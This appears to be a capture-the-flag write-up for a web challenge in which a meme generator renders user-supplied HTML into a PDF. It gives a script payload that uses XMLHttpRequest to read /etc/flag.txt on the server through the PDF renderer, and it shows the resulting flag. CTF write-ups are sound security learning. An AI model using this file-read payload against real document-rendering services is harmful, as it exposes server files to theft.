<h1>Capture the Meme</h1>
<h4>Description: 
<p>Made this meme generator for ya :) hope you like some memes 
Note: Flag at /etc/flag.txt</p>
<h4>Category: Web</h4>
<h4>Link: http://3.129.60.206/</h4>

We are given an app which takes a picture and puts the two texts on the picture and returns a pdf.
If you enter a html tag then that tag is processed and is reflected on the pdf (The image link is available in script.js).
<br></br><img src='./images/Screenshot (103).png' /><br></br>
<br></br><img src='./images/Screenshot (104).png' /><br></br>

This means  we can use script tags too, so now we can use XMLHttpRequest object to read the local file.
Our payload
<h4>
  <script>
    x = new XMLHttpRequest; x.onload = function(){ document.write(this.responseText) }; x.open('GET', 'file:///etc/flag.txt'); x.send();
  </script>
</h4>

Send the above payload in the text and then try to export it. You will get the flag in the pdf(Some part of the flag might not be visible but it is still there so you need to copy all the text and then paste to see the complete flag)
<h4>FLAG: darkCON{wh4t_1f_1_t01d_u_h4v3_r1ght_f14g_0f_th1s_ch411}darkCON{wh4t_1f_1_t01d_u_h4v3_r1ght_f14g_0f_th1s_ch411}
</h4>
